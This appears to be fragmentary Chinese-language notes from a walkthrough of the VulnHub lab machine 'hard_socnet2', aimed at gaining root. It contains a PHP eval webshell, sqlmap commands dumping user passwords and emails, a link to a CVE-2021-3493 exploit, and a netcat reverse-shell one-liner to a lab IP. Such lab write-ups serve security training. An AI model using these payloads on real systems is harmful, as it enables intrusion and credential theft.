> 靶机环境介绍
+ [hard_socnet2](https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/) 
+ 难度等级 <font color=red>高</font>

目标: 取得root权限

**所用技术栈：**
+ 主机发现
+ 端口扫描
+ SQL注入
+ 文件上传
+ 蚁剑上线
+ **XMLRPC命令执行**
+ 逆向工程
+ 动态调试
+ 漏洞利用代码编写



我们进行 `OPTIONS`,`DELETE`,`POST`,`GET`,`PUT` 等一系列方式对服务器进行请求

这个时候我们可以去访问其 80 端口


+ [AntSword Shell Script](https://github.com/AntSwordProject/AwesomeScript) 
+ [Many Demo Shell Download](https://privdayz.com/)


```php
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

```bash
sqlmap -r req -p query --dbs

sqlmap -r req -p query -D socialnetwork --tables

sqlmap -r req -p query -D socialnetwork -T users --columns

sqlmap -r req -p query -D socialnetwork -T users -C user_password,user_email --dump

```


[CVE-2021-3493 漏洞利用代码](https://github.com/briskets/CVE-2021-3493) 
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.7 3333 >/tmp/f
```
